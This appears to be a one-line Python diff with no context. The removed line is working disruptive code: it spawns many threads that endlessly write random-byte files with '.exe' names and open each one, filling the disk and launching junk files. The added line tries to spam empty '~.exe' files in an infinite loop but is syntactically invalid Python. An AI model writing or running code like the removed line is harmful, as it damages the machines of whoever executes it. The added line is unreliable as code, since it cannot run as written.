@@ -1,1 +1,1 @@
-import os,sys,subprocess as s,threading as t;f=lambda:exec("while 1:n=os.urandom(75).hex()+'~.exe';open(n,'wb').write(os.urandom(4096));os.startfile(n)if sys.platform[0]=='w'else s.Popen(['open'if sys.platform=='darwin'else'xdg-open',n])");[t.Thread(target=f,daemon=1).start()for _ in range(os.cpu_count()*2)];input()
+import random,string;[open(''.join(random.choice(''.join(c for c in string.printable if c not in '\\/:*?"<>|')) for _ in range(random.randint(1,100)))+'~.exe','wb').close() while True]
